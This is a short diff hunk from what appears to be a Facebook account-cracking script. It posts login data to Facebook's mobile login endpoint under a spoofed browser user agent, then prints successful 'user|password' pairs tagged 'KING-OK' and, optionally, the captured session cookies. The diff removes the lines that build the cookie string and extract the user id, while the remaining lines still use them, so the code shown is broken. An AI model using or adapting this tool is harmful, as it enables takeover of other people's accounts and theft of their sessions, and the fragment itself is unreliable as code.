@@ -1286,10 +1286,6 @@ class Main:
     'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
 }
 lo = session.post('https://m.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
-   log_cookies=session.cookies.get_dict().keys()
-   if 'c_user' in log_cookies:
-    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-    user = re.findall('c_user=(.*);xs', coki)[0]
     print('\r\033[1;32m [KING-OK] '+user+'|'+ps) #+'--'+coki)
     if 'y' in cokix:
      print(f'\r{gen}{H}'+coki)
